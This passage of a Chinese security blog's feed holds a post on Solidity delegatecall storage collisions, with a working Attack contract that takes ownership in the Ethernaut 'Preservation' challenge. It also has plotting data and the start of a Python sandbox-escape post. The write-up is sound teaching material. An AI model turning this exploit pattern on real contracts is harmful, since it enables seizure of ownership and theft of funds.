class="hljs-number">9</span>,<span class="hljs-number">9</span>,<span class="hljs-number">10</span>,<span class="hljs-number">10</span>,<span class="hljs-number">12</span>,<span class="hljs-number">12</span>,<span class="hljs-number">12</span>,<span class="hljs-number">12</span>,<span class="hljs-number">13</span>,<span class="hljs-number">13</span>,<span class="hljs-number">13</span>,<span class="hljs-number">13</span>,<span class="hljs-number">13</span>,<span class="hljs-number">13</span>,<span class="hljs-number">13</span>,<span class="hljs-number">13</span>,<span class="hljs-number">13</span>,<span class="hljs-number">13</span>,<span class="hljs-number">13</span>,<span class="hljs-number">13</span>,<span class="hljs-number">13</span>,<span class="hljs-number">13</span>,<span class="hljs-number">14</span>,<span class="hljs-number">14</span>,<span class="hljs-number">14</span>,<span class="hljs-number">14</span>,<span class="hljs-number">14</span>,<span class="hljs-number">14</span>,<span class="hljs-number">14</span>,<span class="hljs-number">14</span>,<span class="hljs-number">15</span>,<span class="hljs-number">15</span>,<span class="hljs-number">15</span>,<span class="hljs-number">15</span>,<span class="hljs-number">15</span>,<span class="hljs-number">15</span>,<span class="hljs-number">15</span>,<span class="hljs-number">16</span>,<span class="hljs-number">16</span>,<span class="hljs-number">16</span>,<span class="hljs-number">16</span>,<span class="hljs-number">16</span>,<span class="hljs-number">16</span>,<span class="hljs-number">16</span>,<span class="hljs-number">16</span>,<span class="hljs-number">17</span>,<span class="hljs-number">17</span>,<span class="hljs-number">17</span>,<span class="hljs-number">17</span>,<span class="hljs-number">17</span>,<span class="hljs-number">17</span>,<span class="hljs-number">17</span>,<span class="hljs-number">17</span>,<span class="hljs-number">18</span>,<span class="hljs-number">18</span>,<span class="hljs-number">18</span>,<span class="hljs-number">18</span>,<span class="hljs-number">18</span>,<span class="hljs-number">19</span>,<span class="hljs-number">19</span>,<span class="hljs-number">19</span>,<span class="hljs-number">19</span>,<span class="hljs-number">19</span>,<span class="hljs-number">19</span>,<span class="hljs-number">19</span>,<span class="hljs-number">19</span>,<span class="hljs-number">19</span>,<span class="hljs-number">19</span>,<span class="hljs-number">19</span>,<span class="hljs-number">19</span>,<span class="hljs-number">19</span>,<span class="hljs-number">19</span>,<span class="hljs-number">19</span>,<span class="hljs-number">19</span>,<span class="hljs-number">19</span>,<span class="hljs-number">19</span>,<span class="hljs-number">20</span>,<span class="hljs-number">22</span>,<span class="hljs-number">22</span>,<span class="hljs-number">22</span>,<span class="hljs-number">22</span>,<span class="hljs-number">22</span>,<span class="hljs-number">22</span>,<span class="hljs-number">22</span>,<span class="hljs-number">22</span>,<span class="hljs-number">22</span>,<span class="hljs-number">22</span>,<span class="hljs-number">22</span>,<span class="hljs-number">22</span>,<span class="hljs-number">23</span>,<span class="hljs-number">23</span>,<span class="hljs-number">23</span>,<span class="hljs-number">23</span>,<span class="hljs-number">23</span>,<span class="hljs-number">23</span>,<span class="hljs-number">23</span>,<span class="hljs-number">23</span>,<span class="hljs-number">23</span>,<span class="hljs-number">23</span>,<span class="hljs-number">23</span>,<span class="hljs-number">23</span>,<span class="hljs-number">23</span>,<span class="hljs-number">24</span>,<span class="hljs-number">24</span>,<span class="hljs-number">24</span>,<span class="hljs-number">24</span>,<span class="hljs-number">24</span>,<span class="hljs-number">24</span>,<span class="hljs-number">24</span>,<span class="hljs-number">24</span>,<span class="hljs-number">24</span>,<span class="hljs-number">24</span>,<span class="hljs-number">25</span>,<span class="hljs-number">25</span>,<span class="hljs-number">25</span>,<span class="hljs-number">25</span>,<span class="hljs-number">25</span>,<span class="hljs-number">25</span>,<span class="hljs-number">25</span>,<span class="hljs-number">25</span>,<span class="hljs-number">25</span>,<span class="hljs-number">25</span>,<span class="hljs-number">25</span>,<span class="hljs-number">26</span>,<span class="hljs-number">26</span>,<span class="hljs-number">26</span>,<span class="hljs-number">26</span>,<span class="hljs-number">26</span>,<span class="hljs-number">26</span>,<span class="hljs-number">26</span>,<span class="hljs-number">26</span>,<span class="hljs-number">26</span>,<span class="hljs-number">26</span>,<span class="hljs-number">27</span>,<span class="hljs-number">27</span>,<span class="hljs-number">27</span>,<span class="hljs-number">27</span>,<span class="hljs-number">27</span>,<span class="hljs-number">27</span>,<span class="hljs-number">27</span>,<span class="hljs-number">27</span>,<span class="hljs-number">27</span>,<span class="hljs-number">27</span>,<span class="hljs-number">27</span>,<span class="hljs-number">28</span>,<span class="hljs-number">28</span>,<span class="hljs-number">28</span>,<span class="hljs-number">28</span>,<span class="hljs-number">28</span>,<span class="hljs-number">28</span>,<span class="hljs-number">28</span>,<span class="hljs-number">28</span>,<span class="hljs-number">28</span>,<span class="hljs-number">28</span>,<span class="hljs-number">28</span>,<span class="hljs-number">28</span>,<span class="hljs-number">28</span>,<span class="hljs-number">29</span>,<span class="hljs-number">29</span>,<span class="hljs-number">29</span>,<span class="hljs-number">29</span>,<span class="hljs-number">29</span>,<span class="hljs-number">31</span>,<span class="hljs-number">31</span>,<span class="hljs-number">31</span>,<span class="hljs-number">31</span>,<span class="hljs-number">31</span>,<span class="hljs-number">31</span>,<span class="hljs-number">32</span>,<span class="hljs-number">32</span>,<span class="hljs-number">32</span>,<span class="hljs-number">32</span>,<span class="hljs-number">32</span>,<span class="hljs-number">32</span>,<span class="hljs-number">32</span>,<span class="hljs-number">32</span>,<span class="hljs-number">32</span>,<span class="hljs-number">32</span>,<span class="hljs-number">32</span>,<span class="hljs-number">32</span>,<span class="hljs-number">32</span>,<span class="hljs-number">32</span>,<span class="hljs-number">32</span>,<span class="hljs-number">33</span>,<span class="hljs-number">33</span>,<span class="hljs-number">33</span>,<span class="hljs-number">33</span>,<span class="hljs-number">33</span>,<span class="hljs-number">33</span>,<span class="hljs-number">33</span>,<span class="hljs-number">33</span>,<span class="hljs-number">33</span>,<span class="hljs-number">33</span>,<span class="hljs-number">33</span>,<span class="hljs-number">34</span>,<span class="hljs-number">34</span>,<span class="hljs-number">34</span>,<span class="hljs-number">34</span>,<span class="hljs-number">34</span>,<span class="hljs-number">34</span>,<span class="hljs-number">34</span>,<span class="hljs-number">34</span>,<span class="hljs-number">34</span>,<span class="hljs-number">35</span>,<span class="hljs-number">35</span>,<span class="hljs-number">35</span>,<span class="hljs-number">35</span>,<span class="hljs-number">35</span>,<span class="hljs-number">35</span>,<span class="hljs-number">35</span>,<span class="hljs-number">35</span>,<span class="hljs-number">35</span>,<span class="hljs-number">35</span>,<span class="hljs-number">35</span>,<span class="hljs-number">36</span>,<span class="hljs-number">36</span>,<span class="hljs-number">36</span>,<span class="hljs-number">36</span>,<span class="hljs-number">36</span>,<span class="hljs-number">36</span>,<span class="hljs-number">36</span>,<span class="hljs-number">37</span>,<span class="hljs-number">37</span>,<span class="hljs-number">37</span>,<span class="hljs-number">37</span>,<span class="hljs-number">37</span>,<span class="hljs-number">37</span>,<span class="hljs-number">37</span>,<span class="hljs-number">37</span>,<span class="hljs-number">37</span>,<span class="hljs-number">38</span>,<span class="hljs-number">38</span>,<span class="hljs-number">38</span>,<span class="hljs-number">38</span>,<span class="hljs-number">38</span>,<span class="hljs-number">38</span>,<span class="hljs-number">38</span>,<span class="hljs-number">38</span>,<span class="hljs-number">38</span>,<span class="hljs-number">38</span>,<span class="hljs-number">38</span>,<span class="hljs-number">38</span>,<span class="hljs-number">38</span>,<span class="hljs-number">38</span>,<span class="hljs-number">38</span>,<span class="hljs-number">38</span>,<span class="hljs-number">38</span>,<span class="hljs-number">39</span>,<span class="hljs-number">39</span>,<span class="hljs-number">39</span>]<br>y = [<span class="hljs-number">4</span>,<span class="hljs-number">5</span>,<span class="hljs-number">10</span>,<span class="hljs-number">10</span>,<span class="hljs-number">30</span>,<span class="hljs-number">3</span>,<span class="hljs-number">4</span>,<span class="hljs-number">5</span>,<span class="hljs-number">6</span>,<span class="hljs-number">10</span>,<span class="hljs-number">29</span>,<span class="hljs-number">30</span>,<span class="hljs-number">3</span>,<span class="hljs-number">4</span>,<span class="hljs-number">10</span>,<span class="hljs-number">16.17</span>,<span class="hljs-number">22</span>,<span class="hljs-number">23</span>,<span class="hljs-number">24</span>,<span class="hljs-number">25</span>,<span class="hljs-number">29</span>,<span class="hljs-number">30</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-number">4</span>,<span class="hljs-number">5</span>,<span class="hljs-number">10</span>,<span class="hljs-number">15</span>,<span class="hljs-number">16</span>,<span class="hljs-number">18</span>,<span class="hljs-number">21</span>,<span class="hljs-number">22</span>,<span class="hljs-number">24</span>,<span class="hljs-number">25</span>,<span class="hljs-number">29</span>,<span class="hljs-number">30</span>,<span class="hljs-number">3</span>,<span class="hljs-number">4</span>,<span class="hljs-number">10</span>,<span class="hljs-number">15</span>,<span class="hljs-number">17</span>,<span class="hljs-number">18</span>,<span class="hljs-number">19</span>,<span class="hljs-number">21</span>,<span class="hljs-number">22</span>,<span class="hljs-number">25</span>,<span class="hljs-number">28</span>,<span class="hljs-number">29</span>,<span class="hljs-number">3</span>,<span class="hljs-number">4</span>,<span class="hljs-number">10</span>,<span class="hljs-number">15</span>,<span class="hljs-number">16</span>,<span class="hljs-number">18</span>,<span class="hljs-number">19</span>,<span class="hljs-number">21</span>,<span class="hljs-number">22</span>,<span class="hljs-number">25</span>,<span class="hljs-number">29</span>,<span class="hljs-number">34</span>,<span class="hljs-number">10</span>,<span class="hljs-number">11</span>,<span class="hljs-number">12</span>,<span class="hljs-number">13</span>,<span class="hljs-number">15</span>,<span class="hljs-number">18</span>,<span class="hljs-number">19</span>,<span class="hljs-number">22</span>,<span class="hljs-number">23</span>,<span class="hljs-number">24</span>,<span class="hljs-number">25</span>,<span class="hljs-number">29</span>,<span class="hljs-number">30</span>,<span class="hljs-number">3</span>,<span class="hljs-number">4</span>,<span class="hljs-number">11</span>,<span class="hljs-number">12</span>,<span class="hljs-number">15</span>,<span class="hljs-number">16</span>,<span class="hljs-number">17</span>,<span class="hljs-number">18</span>,<span class="hljs-number">19</span>,<span class="hljs-number">20</span>,<span class="hljs-number">25</span>,<span class="hljs-number">29</span>,<span class="hljs-number">30</span>,<span class="hljs-number">20</span>,<span class="hljs-number">21</span>,<span class="hljs-number">23</span>,<span class="hljs-number">24</span>,<span class="hljs-number">30</span>,<span class="hljs-number">31</span>,<span class="hljs-number">22</span>,<span class="hljs-number">24</span>,<span class="hljs-number">22</span>,<span class="hljs-number">23</span>,<span class="hljs-number">24</span>,<span class="hljs-number">25</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-number">3</span>,<span class="hljs-number">4</span>,<span class="hljs-number">9</span>,<span class="hljs-number">10</span>,<span class="hljs-number">11</span>,<span class="hljs-number">12</span>,<span class="hljs-number">16</span>,<span class="hljs-number">17</span>,<span class="hljs-number">18</span>,<span class="hljs-number">19</span>,<span class="hljs-number">24</span>,<span class="hljs-number">25</span>,<span class="hljs-number">2</span>,<span class="hljs-number">5</span>,<span class="hljs-number">6</span>,<span class="hljs-number">9</span>,<span class="hljs-number">12</span>,<span class="hljs-number">18</span>,<span class="hljs-number">22</span>,<span class="hljs-number">23</span>,<span class="hljs-number">5</span>,<span class="hljs-number">9</span>,<span class="hljs-number">12</span>,<span class="hljs-number">18</span>,<span class="hljs-number">19</span>,<span class="hljs-number">22</span>,<span class="hljs-number">23</span>,<span class="hljs-number">4</span>,<span class="hljs-number">5</span>,<span class="hljs-number">9</span>,<span class="hljs-number">12</span>,<span class="hljs-number">17</span>,<span class="hljs-number">18</span>,<span class="hljs-number">23</span>,<span class="hljs-number">24</span>,<span class="hljs-number">3</span>,<span class="hljs-number">4</span>,<span class="hljs-number">9</span>,<span class="hljs-number">12</span>,<span class="hljs-number">16</span>,<span class="hljs-number">17</span>,<span class="hljs-number">24</span>,<span class="hljs-number">25</span>,<span class="hljs-number">3</span>,<span class="hljs-number">9</span>,<span class="hljs-number">12</span>,<span class="hljs-number">16</span>,<span class="hljs-number">25</span>,<span class="hljs-number">3</span>,<span class="hljs-number">4</span>,<span class="hljs-number">5</span>,<span class="hljs-number">6</span>,<span class="hljs-number">9</span>,<span class="hljs-number">10</span>,<span class="hljs-number">11</span>,<span class="hljs-number">12</span>,<span class="hljs-number">16</span>,<span class="hljs-number">17</span>,<span class="hljs-number">18</span>,<span class="hljs-number">19</span>,<span class="hljs-number">21</span>,<span class="hljs-number">22</span>,<span class="hljs-number">23</span>,<span class="hljs-number">24</span>,<span class="hljs-number">25</span>,<span class="hljs-number">10</span>,<span class="hljs-number">11</span>,<span class="hljs-number">3</span>,<span class="hljs-number">4</span>,<span class="hljs-number">5</span>,<span class="hljs-number">6</span>,<span class="hljs-number">10</span>,<span class="hljs-number">11</span>,<span class="hljs-number">12</span>,<span class="hljs-number">17</span>,<span class="hljs-number">18</span>,<span class="hljs-number">19</span>,<span class="hljs-number">24</span>,<span class="hljs-number">25</span>,<span class="hljs-number">3</span>,<span class="hljs-number">6</span>,<span class="hljs-number">7</span>,<span class="hljs-number">9</span>,<span class="hljs-number">10</span>,<span class="hljs-number">16</span>,<span class="hljs-number">17</span>,<span class="hljs-number">19</span>,<span class="hljs-number">20</span>,<span class="hljs-number">22</span>,<span class="hljs-number">23</span>,<span class="hljs-number">24</span>,<span class="hljs-number">25</span>,<span class="hljs-number">3</span>,<span class="hljs-number">6</span>,<span class="hljs-number">7</span>,<span class="hljs-number">9</span>,<span class="hljs-number">10</span>,<span class="hljs-number">15</span>,<span class="hljs-number">18</span>,<span class="hljs-number">19</span>,<span class="hljs-number">23</span>,<span class="hljs-number">24</span>,<span class="hljs-number">3</span>,<span class="hljs-number">6</span>,<span class="hljs-number">7</span>,<span class="hljs-number">10</span>,<span class="hljs-number">11</span>,<span class="hljs-number">12</span>,<span class="hljs-number">16</span>,<span class="hljs-number">19</span>,<span class="hljs-number">20</span>,<span class="hljs-number">24</span>,<span class="hljs-number">25</span>,<span class="hljs-number">3</span>,<span class="hljs-number">6</span>,<span class="hljs-number">7</span>,<span class="hljs-number">12</span>,<span class="hljs-number">13</span>,<span class="hljs-number">16</span>,<span class="hljs-number">19</span>,<span class="hljs-number">20</span>,<span class="hljs-number">24</span>,<span class="hljs-number">25</span>,<span class="hljs-number">3</span>,<span class="hljs-number">6</span>,<span class="hljs-number">7</span>,<span class="hljs-number">9</span>,<span class="hljs-number">12</span>,<span class="hljs-number">13</span>,<span class="hljs-number">16</span>,<span class="hljs-number">19</span>,<span class="hljs-number">20</span>,<span class="hljs-number">24</span>,<span class="hljs-number">25</span>,<span class="hljs-number">3</span>,<span class="hljs-number">4</span>,<span class="hljs-number">6</span>,<span class="hljs-number">9</span>,<span class="hljs-number">10</span>,<span class="hljs-number">11</span>,<span class="hljs-number">12</span>,<span class="hljs-number">16</span>,<span class="hljs-number">17</span>,<span class="hljs-number">19</span>,<span class="hljs-number">20</span>,<span class="hljs-number">24</span>,<span class="hljs-number">25</span>,<span class="hljs-number">4</span>,<span class="hljs-number">5</span>,<span class="hljs-number">17</span>,<span class="hljs-number">18</span>,<span class="hljs-number">19</span>,<span class="hljs-number">10</span>,<span class="hljs-number">11</span>,<span class="hljs-number">12</span>,<span class="hljs-number">13</span>,<span class="hljs-number">25</span>,<span class="hljs-number">31</span>,<span class="hljs-number">4</span>,<span class="hljs-number">5</span>,<span class="hljs-number">6</span>,<span class="hljs-number">10</span>,<span class="hljs-number">11</span>,<span class="hljs-number">12</span>,<span class="hljs-number">13</span>,<span class="hljs-number">17</span>,<span class="hljs-number">18</span>,<span class="hljs-number">19</span>,<span class="hljs-number">23</span>,<span class="hljs-number">24</span>,<span class="hljs-number">25</span>,<span class="hljs-number">26</span>,<span class="hljs-number">32</span>,<span class="hljs-number">3</span>,<span class="hljs-number">4</span>,<span class="hljs-number">5</span>,<span class="hljs-number">6</span>,<span class="hljs-number">7</span>,<span class="hljs-number">12</span>,<span class="hljs-number">16</span>,<span class="hljs-number">17</span>,<span class="hljs-number">23</span>,<span class="hljs-number">24</span>,<span class="hljs-number">26</span>,<span class="hljs-number">32</span>,<span class="hljs-number">6</span>,<span class="hljs-number">7</span>,<span class="hljs-number">11</span>,<span class="hljs-number">16</span>,<span class="hljs-number">17</span>,<span class="hljs-number">23</span>,<span class="hljs-number">24</span>,<span class="hljs-number">26</span>,<span class="hljs-number">32</span>,<span class="hljs-number">6</span>,<span class="hljs-number">11</span>,<span class="hljs-number">12</span>,<span class="hljs-number">17</span>,<span class="hljs-number">18</span>,<span class="hljs-number">19</span>,<span class="hljs-number">23</span>,<span class="hljs-number">24</span>,<span class="hljs-number">25</span>,<span class="hljs-number">26</span>,<span class="hljs-number">33</span>,<span class="hljs-number">5</span>,<span class="hljs-number">12</span>,<span class="hljs-number">13</span>,<span class="hljs-number">19</span>,<span class="hljs-number">20</span>,<span class="hljs-number">26</span>,<span class="hljs-number">32</span>,<span class="hljs-number">4</span>,<span class="hljs-number">5</span>,<span class="hljs-number">13</span>,<span class="hljs-number">16</span>,<span class="hljs-number">19</span>,<span class="hljs-number">20</span>,<span class="hljs-number">25</span>,<span class="hljs-number">26</span>,<span class="hljs-number">32</span>,<span class="hljs-number">4</span>,<span class="hljs-number">5</span>,<span class="hljs-number">6</span>,<span class="hljs-number">7</span>,<span class="hljs-number">9</span>,<span class="hljs-number">10</span>,<span class="hljs-number">11</span>,<span class="hljs-number">12</span>,<span class="hljs-number">13</span>,<span class="hljs-number">16</span>,<span class="hljs-number">17</span>,<span class="hljs-number">18</span>,<span class="hljs-number">19</span>,<span class="hljs-number">24</span>,<span class="hljs-number">25</span>,<span class="hljs-number">31</span>,<span class="hljs-number">32</span>,<span class="hljs-number">23</span>,<span class="hljs-number">24</span>,<span class="hljs-number">31</span>]<br><br>plt.plot(x,y,<span class="hljs-string">&#x27;rH&#x27;</span>)<br>plt.show()<br></code></pre></td></tr></table></figure><p>绘图得到</p>]]></content>
      
      
      <categories>
          
          <category> Misc </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Delegatecall</title>
      <link href="/2023/10/26/Delegatecall/"/>
      <url>/2023/10/26/Delegatecall/</url>
      
        <content type="html"><![CDATA[<h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><h4 id="三种调用函数"><a href="#三种调用函数" class="headerlink" title="三种调用函数"></a>三种调用函数</h4><p>在 Solidity 中，call 函数簇可以实现跨合约的函数调用功能，其中包括 call、delegatecall 和 callcode 三种方式。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs solidity">&lt;address&gt;.call(...) returns (bool)<br>&lt;address&gt;.callcode(...) returns (bool)<br>&lt;address&gt;.delegatecall(...) returns (bool)<br><br></code></pre></td></tr></table></figure><p>中的内置变量 <code>msg</code> 会随着调用的发起而改变，<code>msg</code> 保存了调用方的信息包括：调用发起的地址，交易金额，被调用函数字符序列等。</p><h5 id="异同点"><a href="#异同点" class="headerlink" title="异同点"></a>异同点</h5><p>call ：调用后会将msg的值修改为调用者，执行环境为被调用的运行环境</p><p>delegatecall: 调用后内置变量 <code>msg</code> 的值不会修改为调用者，但执行环境为调用者的运行环境（相当于复制被调用者的代码到调用者合约）</p><p>callcode: 调用后内置变量 <code>msg</code> 的值会修改为调用者，但执行环境为调用者的运行环境</p><h3 id="delegatecall的滥用"><a href="#delegatecall的滥用" class="headerlink" title="delegatecall的滥用"></a>delegatecall的滥用</h3><h4 id="威胁分析"><a href="#威胁分析" class="headerlink" title="威胁分析"></a>威胁分析</h4><p>delegatecall 调用有 <code>address</code> 和 <code>msg.data</code> 两个参数</p><p> 若 <code>msg.data</code> 可控，则可调用 <code>address</code> 处任意函数</p><h4 id="原因分析"><a href="#原因分析" class="headerlink" title="原因分析"></a>原因分析</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs solidity">pragma solidity ^0.4.23;<br><br>contract A &#123;<br>    address public c;<br>    address public b;<br><br>    function test() public returns (address a) &#123;<br>        a = address(this);<br>        b = a;<br>    &#125;<br>&#125;<br><br>contract B &#123;<br>    address public b;<br>    address public c;<br><br>    function withdelegatecall(address testaddress) public &#123;<br>        testaddress.delegatecall(bytes4(keccak256(&quot;test()&quot;)));<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>当部署两个合约后，使用外部账户调用withdelegatecall函数。</p><p>A合约中，c&#x3D;0；b&#x3D;0；</p><p>B合约中，b&#x3D;0；c&#x3D;address (A)</p><p>事实上调用 delegatecall 来使用 Storage 变量时依据并不是变量名，而是变量的存储位，这样的话我们就可以达到覆盖相关变量的目的。</p><h3 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h3><h4 id="ethernaut-第-16-题"><a href="#ethernaut-第-16-题" class="headerlink" title="ethernaut 第 16 题"></a><a href="https://ethernaut.openzeppelin.com/">ethernaut</a> 第 16 题</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs solidity">pragma solidity ^0.8.0;<br><br>contract Preservation &#123;<br><br>  // public library contracts <br>  address public timeZone1Library;<br>  address public timeZone2Library;<br>  address public owner; <br>  uint storedTime;<br>  // Sets the function signature for delegatecall<br>  bytes4 constant setTimeSignature = bytes4(keccak256(&quot;setTime(uint256)&quot;));<br><br>  constructor(address _timeZone1LibraryAddress, address _timeZone2LibraryAddress) public &#123;<br>    timeZone1Library = _timeZone1LibraryAddress; <br>    timeZone2Library = _timeZone2LibraryAddress; <br>    owner = msg.sender;<br>  &#125;<br><br>  // set the time for timezone 1<br>  function setFirstTime(uint _timeStamp) public &#123;<br>    timeZone1Library.delegatecall(setTimeSignature, _timeStamp);<br>  &#125;<br><br>  // set the time for timezone 2<br>  function setSecondTime(uint _timeStamp) public &#123;<br>    timeZone2Library.delegatecall(setTimeSignature, _timeStamp);<br>  &#125;<br>&#125;<br><br>// Simple library contract to set the time<br>contract LibraryContract &#123;<br><br>  // stores a timestamp <br>  uint storedTime;  <br><br>  function setTime(uint _time) public &#123;<br>    storedTime = _time;<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h5 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h5><p>要想改变owner，只有constructor函数，但是有delegatecall漏洞。</p><p>setFirstTime(uint _timeStamp) </p><p>setSecondTime(uint _timeStamp)</p><p>这两个函数是调用setTime函数。也就是说，当我们第一次调用setFirstTime函数时，就会设置solt0为攻击合约的地址，第二次调用该函数时就会调用该合约的函数即，改变的是solt2。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><code class="hljs solidity">pragma solidity ^0.8.0;<br><br>contract Preservation &#123;<br><br>  // public library contracts <br>  address public timeZone1Library;<br>  address public timeZone2Library;<br>  address public owner; <br>  uint storedTime;<br>  // Sets the function signature for delegatecall<br>  bytes4 constant setTimeSignature = bytes4(keccak256(&quot;setTime(uint256)&quot;));<br><br>  constructor(address _timeZone1LibraryAddress, address _timeZone2LibraryAddress) public &#123;<br>    timeZone1Library = _timeZone1LibraryAddress; <br>    timeZone2Library = _timeZone2LibraryAddress; <br>    owner = msg.sender;<br>  &#125;<br><br>  // set the time for timezone 1<br>  function setFirstTime(uint _timeStamp) public &#123;<br>    timeZone1Library.delegatecall(setTimeSignature, _timeStamp);<br>  &#125;<br><br>  // set the time for timezone 2<br>  function setSecondTime(uint _timeStamp) public &#123;<br>    timeZone2Library.delegatecall(setTimeSignature, _timeStamp);<br>  &#125;<br>&#125;<br><br>// Simple library contract to set the time<br>contract LibraryContract &#123;<br><br>  // stores a timestamp <br>  uint storedTime;  <br><br>  function setTime(uint _time) public &#123;<br>    storedTime = _time;<br>  &#125;<br>&#125;<br><br>contract Attack &#123;<br>  address public timeZone1Library;<br>  address public timeZone2Library;<br>  address public owner; <br>  uint storedTime;<br>  Preservation public target; // target Preservation contract<br><br>  constructor(address _target) public &#123;<br>    target = Preservation(_target);<br>  &#125;<br><br>  function attack1() public &#123;<br>    target.setFirstTime(uint256(uint160(address(this))));<br>    target.setFirstTime(uint256(uint160(msg.sender)));<br>  &#125;<br><br>  // overwrite the library addresses and owner address<br>  function setTime(uint _time) public &#123;<br>   owner=address(uint160(_time));<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>调用attack1().</p>]]></content>
      
      
      <categories>
          
          <category> Blockchain </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Attack </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Pyjail（上）</title>
      <link href="/2023/10/25/Pyjail%E4%B8%8A/"/>
      <url>/2023/10/25/Pyjail%E4%B8%8A/</url>
      
        <content type="html"><![CDATA[<h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h3><p>[<a href="https://zhuanlan.zhihu.com/p/578966149">PyJail] python沙箱逃逸探究·总览（HNCTF题解） - 知乎 (zhihu.com)</a></p><p><a href="http://lihuaxi.xjx100.cn/news/1475226.html?action=onClick">Python Jail 沙盒逃逸 合集 (xjx100.cn)</a></p><p><a href="https://www.cnblogs.com/mumuhhh/p/17811377.html">Jail 【Python沙箱逃逸问题合集】 - Kicky_Mu - 博客园 (cnblogs.com)</a></p><h3 id="魔术方法"><a href="#魔术方法" class="headerlink" title="魔术方法"></a>魔术方法</h3><ul><li><ul><li><code>__init__</code>：构造函数。这个在实例化类的时候就会用到，一般是接受类初始化的参数，并且进行一系列初始化操作。</li><li><code>__len__</code>：返回对象的长度。对一个对象<code>a</code>使用<code>len(a)</code>时，会尝试调用<code>a.__len__()</code>。这个做炼丹的同学应该很熟悉，例如要通过继承<code>torch.utils.data.Dataset</code>来实现自己的数据集时，就需要实现这个方法；</li><li><code>__str__</code>：返回对象的字符串表示。对一个对象<code>a</code>使用<code>str(a)</code>时，会尝试调用<code>a.__str__()</code>。这在我们自己实现一些类，譬如复数、二叉树、有限域、椭圆曲线等时，通过实现该方法，能将对象的内容较好地打印出来。（<code>print</code>函数中也会自动调用对象的<code>__str__</code>方法）相似地，还有<code>__int__</code>魔术方法也用于类型转换，不过较少使用；</li><li><code>__getitem__</code>：根据索引返回对象的某个元素。对一个对象<code>a</code>使用<code>a[1]</code>时，会尝试调用<code>a.__getitem__(1)</code>。同样，当我们通过继承<code>torch.utils.data.Dataset</code>来实现自己的数据集时，就需要实现这个方法。有<code>__getitem__</code>，自然也有对应的<code>__setitem__</code>；</li><li><code>__add__</code>、<code>__sub__</code>、<code>__mul__</code>、<code>__div__</code>、<code>__mod__</code>：算术运算，加减乘除模。如对一个对象<code>a</code>使用<code>a+b</code>时，会尝试调用<code>a.__add__(b)</code>。相应地，对于有些运算，对象需放在后面（第二个操作数）的，则需实现<code>__radd__</code>、<code>__rsub__</code>、<code>__rmul__</code>、<code>__rdiv__</code>、<code>__rmod__</code>，如椭圆曲线上的点的倍点运算<code>G -&gt; d * 